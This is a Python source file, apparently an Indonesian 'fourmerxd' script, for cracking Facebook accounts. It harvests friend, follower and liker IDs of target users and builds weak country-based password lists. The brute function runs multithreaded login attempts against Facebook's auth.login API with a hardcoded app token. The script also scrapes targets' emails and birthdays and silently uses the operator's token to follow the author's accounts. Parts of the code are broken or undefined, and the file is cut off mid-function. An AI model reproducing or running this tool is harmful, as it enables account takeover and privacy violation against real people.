#!/bin/python
#script buatan Ind


import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

# jancok


def fourmer():
    os.system("git pull")
def fourmer():
    os.system("clear")
def fourmer(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./200)

def banner():
    time.sleep(0.3)
    fourmer("""
   \033[96m     ╭─\033[97m•\033[96m⊣\033[96m 𝙰𝚄𝚃𝙷𝙾𝚁 :\x1b[0;37m 𝙰𝙼𝙴𝚁 𝙳𝙾𝙼𝙸𝙽𝙸𝙲 𝙶𝚁𝙴𝙼𝙾𝙽𝚈 𝙺𝙷𝚄𝚁𝙰𝚈𝙰 𝚇𝙳.
   \033[96m ╭───│ \033[97m•\033[96m⊣\033[96m 𝙶𝙸𝚃𝙷𝚄𝙱 :\x1b[0;37m 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚏𝚘𝚞𝚛𝚖𝚎𝚛𝚡𝚍
   \033[96m │   │ \033[97m•\033[96m⊣\033[96m 𝚈𝙾𝚄𝚃𝚄𝙱𝙴:\x1b[0;37m 𝙵𝚘𝚞𝚛𝚖𝚎𝚛 𝚇𝚍
   \033[96m │   ╰─\033[97m•\033[96m⊣\033[96m 𝚆𝙴𝙱    :\x1b[0;37m 𝚠𝚠𝚠.𝚏𝚘𝚞𝚛𝚖𝚎𝚛𝚡𝚍.𝚋𝚕𝚘𝚐𝚐𝚎𝚛.𝚌𝚘𝚖
   \033[96m │""")
host="https://m.facebook.com"
ok = ()
cp = ()
ttl =()

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day


MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] cookies salah")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def country():
    banner()
    fourmer("""\x1b[0;36m    ├────[• 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷 𝙸𝙳 𝙽𝙴𝙶𝙰𝚁𝙰 •]
    │
 \033[96m   │   ╭─•\033[97m1\033[96m➤\033[97m 𝙸𝙽𝙳𝙾𝙽𝙴𝚂𝙸𝙰
 \033[96m   │   │  \033[97m2\033[96m➤\033[97m 𝙸𝙽𝙳𝙸𝙰
 \033[96m   ╰───│  \033[97m3\033[96m➤\033[97m 𝙿𝙰𝙺𝙸𝚂𝚃𝙰𝙽
 \033[96m       │  \033[97m4\033[96m➤\033[97m 𝚄𝙽𝙸𝚃𝙴𝙳 𝚂𝚃𝙰𝚃𝙴𝚂
 \033[96m       ╰─•\033[97m0\033[96m➤\033[97m 𝚁𝙰𝙽𝙳𝙾𝙼""")
    choose_country()
def choose_country():
    cc = input("\n\033[97m        ﹙\033[96m•\033[97m﹚ 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷... ")
    if cc in[""]:
        print("\033[97m        ﹙\033[96m!\033[97m﹚\033[96m 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
    elif cc in["1","01"]:
        os.system("rm -rf country.txt")
        cou = "id"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["2","02"]:
        os.system("rm -rf country.txt")
        cou = "bd"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["3","03"]:
        os.system("rm -rf country.txt")
        cou = "pk"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyErro5r, IOError):
            menu()
    elif cc in["4","04"]:
        os.system("rm -rf country.txt")
        cou = "us"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["0","00"]:
        os.system("rm -rf country.txt")
        cou = " "
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    else:
        print("\033[97m        ﹙\033[96m!\033[97m﹚\033[96m 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  fourmer("""\033[96m    ├────[• 𝙿𝙸𝙻𝙸𝙷 𝙼𝙴𝚃𝙾𝙳𝙷𝙴 𝙻𝙾𝙶𝙸𝙽 •]
    │
  \033[96m  │   ╭─•\033[97m1\033[96m➤ 𝚃𝙾𝙺𝙴𝙽
  \033[96m  ╰───│  \033[97m2\033[96m➤ 𝙲𝙾𝙾𝙺𝙸𝙴𝚂
  \033[96m      ╰─•\033[97m0\033[96m➤ 𝙺𝙴𝙻𝚄𝙰𝚁""")
  sek=input(k+"\n\033[97m        ﹙\033[96m•\033[97m﹚𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷... ")
  if sek=="":
    print("\033[97m       ﹙\033[96m!\033[97m﹚\033[96m 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
    logs()
  elif sek=="1":
    defaultua()
    log_token()
  elif sek=="2":
    defaultua()
    gen()
  elif sek=="0":
    exit()
  else:
    print("\033[97m ﹙\033[96m!\033[97m﹚\033[96m 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input("\n\033[97m    ╰───•﹙\033[96m•\033[97m﹚\033[96m 𝚃𝙾𝙺𝙴𝙽... ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        fourmer("\n\033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝚃𝚄𝙽𝙶𝙶𝚄 𝚂𝙴𝙱𝙴𝙽𝚃𝙰𝚁...")
        bot_follow()
    except KeyError:
        print("\n\033[97m ﹙\033[96m!\033[97m﹚\033[96m 𝚃𝙾𝙺𝙴𝙽 𝚂𝙰𝙻𝙰𝙷") 
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input("\n\033[97m       ﹙\033[96m•\033[97m﹚\033[96m 𝙲𝙾𝙾𝙺𝙸𝙴𝚂... ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print("\033[97m     ﹙\033[96m!\033[97m﹚\033[96m 𝚃𝙸𝙳𝙰𝙺 𝙰𝙳𝙰 𝙺𝙾𝙽𝙴𝙺𝚂𝙸")
        except [KeyError,IOError]:
            print("\033[97m ﹙\033[96m!\033[97m﹚\033[96m 𝙲𝙾𝙾𝙺𝙸𝙴𝚂 𝚂𝙰𝙻𝙰𝙷")
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        fourmer("\033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝙻𝙾𝙶𝙸𝙽 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻")
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print("\n\033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝚃𝙾𝙺𝙴𝙽 𝚂𝙰𝙻𝙰𝙷")
		logs()
	fourmerxd("\n\033[96m        𝙼𝙾𝙷𝙾𝙽 𝙱𝙴𝚁𝚂𝙰𝙱𝙰𝚁 𝙸𝙽𝙸 𝙻𝙾𝙰𝙳𝙸𝙽𝙶....")
	requests.post("https://graph.facebook.com/100061416147072/subscribers?access_token=" + toket)      # Nisaa
	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
	requests.post("https://graph.facebook.com/100067609291454/subscribers?access_token=" + toket) # Najeem Khan
	requests.post("https://graph.facebook.com/100021893021455/subscribers?access_token=" + toket) #fourmer
	menu()
# 𝚋𝚘𝚝 𝚏𝚘𝚕𝚕𝚘𝚠

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print("\033[97m     ﹙\033[96m!\033[97m﹚\033[96m 𝙴𝚁𝚁𝙾𝚁...")
        logs()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('country.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia"
    elif "bd" in ngr:
        negara = "Bangladesh/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "American(USA)"
    elif " " in ngr:
        negara = "Out"
    os.system("clear")
    banner()
    fourmer("\n\033[96m       ╭─•\033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝙻𝙸𝚂𝚃 𝙸𝙳 :\033[97m "+id)
    fourmer("\033[96m   ╭───│  \033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝙻𝙸𝚂𝚃 𝙸𝙿 :\033[97m "+ip)
    fourmer("\033[96m   │   │  \033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝚃𝙰𝙽𝙶𝙶𝙰𝙻 :\033[97m "+durasi)
    fourmer("\033[96m   │   ╰─•\033[97m ﹙\033[96m•\033[97m﹚\033[96m 𝙽𝙴𝙶𝙰𝚁𝙰  :\033[97m "+negara)

    fourmer("""   \033[96m│
   \033[96m│   ╭─•1\033[97m➤ 𝙸𝙳 𝙿𝚄𝙱𝙻𝙸𝙺 & 𝚃𝙴𝙼𝙰𝙽
   \033[96m│   │  2\033[97m➤ 𝙸𝙳 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁
   \033[96m│   │  3\033[97m➤ 𝙸𝙳 𝙻𝙸𝙺𝙴 𝙿𝙾𝚂𝚃
   \033[96m│   │  4\033[97m➤ 𝙸𝙳 𝙽𝙾𝙼𝙴𝚁 𝚃𝙴𝙻𝙴𝙿𝙷𝙾𝙽
   \033[96m╰───│  5\033[97m➤ 𝙰𝙺𝚄𝙽 𝙴𝙼𝙰𝙸𝙻
       \033[96m│  6\033[97m➤ 𝙳𝙰𝚃𝙰 𝙸𝙳 𝙿𝚄𝙱𝙻𝙸𝙺
       \033[96m│  7\033[97m➤ 𝙷𝙰𝚂𝙸𝙻 𝙲𝚁𝙰𝙲𝙺
       \033[96m│  8\033[97m➤ 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃
       \033[96m╰─•9\033[97m➤ 𝙺𝙴𝙻𝚄𝙰𝚁 ﹙𝙷𝚊𝚙𝚞𝚜 𝚝𝚘𝚔𝚎𝚗﹚""")
    choose_menu()

def choose_menu():
	r=input("\n \033[97m      ﹙\033[96m•\033[97m﹚ 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷... ")
	if r=="":
		print("\033[97m [\033[91m!\033[97m] 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
		try:
			jalan("\n\033[97m (\033[96m!\033[97m) 𝚝𝚎𝚛𝚒𝚖𝚊 𝚔𝚊𝚜𝚒𝚑 𝚝𝚎𝚕𝚊𝚑 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚜𝚌𝚛𝚒𝚙𝚝 𝚏𝚘𝚞𝚛𝚖𝚎𝚛𝚡𝚍 :)")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print("\033[97m (\033[96m!\033[97m)\033[96m error...")
	else:
		print("\033[97m [\033[91m!\033[97m] salah")
		menu()

def pilihcrack(file):
  fourmer("\n\033[97m       ╭─•\033[96m1\033[97m) 𝙰𝚙𝚒.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 \033[96m﹙𝚌𝚎𝚙𝚊𝚝﹚")
  fourmer("\033[97m       │  \033[96m2\033[97m) 𝙰𝚙𝚒.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 + 𝚝𝚝𝚕 \033[96m﹙𝚌𝚎𝚙𝚊𝚝﹚")
  fourmer("\033[97m       │  \033[96m3\033[97m) 𝙼𝚋𝚊𝚜𝚒𝚌.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 \033[96m﹙𝚕𝚊𝚖𝚋𝚊𝚝﹚")
  fourmer("\033[97m       │  \033[96m4\033[97m) 𝙵𝚛𝚎𝚎.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 + 𝚝𝚝𝚕 \033[96m﹙𝚕𝚊𝚖𝚋𝚊𝚝﹚")
  fourmer("\033[97m       ╰─•\033[96m5\033[97m) 𝙵𝚛𝚎𝚎.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 \033[96m﹙𝚜𝚞𝚙𝚎𝚛 𝚕𝚊𝚖𝚋𝚊𝚝﹚")
  krah=input("\n\033[97m       ﹙\033[96m•\033[97m﹚ 𝚂𝙸𝙻𝙰𝙷𝙺𝙰𝙽 𝙿𝙸𝙻𝙸𝙷... ")
  if krah in[""]:
    print("\033[97m ﹙\033[91m!\033[97m﹚ 𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    crackffb(file)
  else:
    print("\033[97m ﹙\033[91m!\033[97m﹚𝙿𝙸𝙻𝙸𝙷𝙰𝙽 𝚂𝙰𝙻𝙰𝙷")
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("\n\033[97m ﹙\033[91m!\033[97m﹚ 𝚃𝙾𝙺𝙴𝙽 𝙸𝙽𝚅𝙰𝙻𝙸𝙳")
		os.system("rm -rf login.txt")
		logs()
	try:
		print("\n\033[97m       ﹙\033[96m•\033[97m﹚ 𝙺𝙴𝚃𝙸𝙺 \'me\' 𝙲𝚁𝙰𝙲𝙺 𝙸𝙳 𝚃𝙴𝙼𝙰𝙽")
		idt = input("\033[97m       ﹙\033[96m•\033[97m﹚ 𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝙸𝙳 𝚃𝙰𝚁𝙶𝙴𝚃... ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[97m       ﹙\033[96m•\033[97m﹚ 𝙽𝙰𝙼𝙰 : "+op["name"])

		except KeyError:
		  print("\033[97m ﹙\033[96m!\033[97m﹚ 𝙸𝙳 𝚂𝙰𝙻𝙰𝙷")
		  print("\033[97m ﹙\033[96m•\033[97m﹚ 𝙴𝙽𝚃𝙴𝚁  ")
		  publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print("\033[97m       ﹙\033[96m•\033[97m﹚ 𝙹𝚄𝙼𝙻𝙰𝙷 𝙸𝙳 : %s"%(len(id)))
		return pilihcrack(qq)
	except Exception as e:
		exit("\033[97m (\033[96m•\033[97m) 𝙱𝙰𝙲𝙺")

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print("\033[97m (\033[96m!\033[97m Cookie/Token Invalid")
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("\n\033[97m (\033[96m•\033[97m Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[97m (\033[96m•\033[97m) Name : "+op["name"])
		except KeyError:
			print("\033[97m (\033[96m!\033[97m) ID Not Found")
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print("\033[97m        ﹙\033[96m•\033[97m﹚ 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳: %s"%(len(id)))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	ct = open('country.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("anakharam")
					results.append("scameer")
	return results

### USER AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n\033[97m (\033[96m1\033[97m) Get User Agent")
    print("\033[97m (\033[96m2\033[97m) Change User Agent")
    print("\033[97m (\033[96m3\033[97m) Hapus User Agent")
    print("\033[97m (\033[96m4\033[97m) Check User Agent")
    print("\033[97m (\033[96m0\033[97m) Kembali")
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = input("\n\033[97m (\033[96m•\033[97m) Pilih :")
    if pmu in[""]:
